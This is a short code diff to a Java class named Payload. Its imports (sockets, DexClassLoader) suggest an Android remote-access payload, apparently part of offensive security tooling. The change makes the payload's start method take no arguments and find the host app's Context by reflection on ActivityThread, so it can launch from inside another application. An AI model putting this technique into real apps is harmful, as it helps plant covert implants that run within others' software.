@@ -7,6 +7,7 @@ import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.OutputStream;
+import java.lang.reflect.Method;
 import java.net.Socket;
 
 import dalvik.system.DexClassLoader;
@@ -18,11 +19,22 @@ public class Payload {
 
     public static Context context;
 
-    public static void start(Context context) {
+    public static void start() {
+        Context context = null;
+        try {
+            final Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
+            final Method method = activityThreadClass.getMethod("currentApplication");
+            context = (Context) method.invoke(null, (Object[]) null);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
         // Set the working directory somewhere writeable
         System.setProperty("user.dir", context.getFilesDir().getAbsolutePath());
+
         // Store the context
-        Payload.context = context;
+        Payload.context = context.getApplicationContext();
+
         startAsync();
     }
 
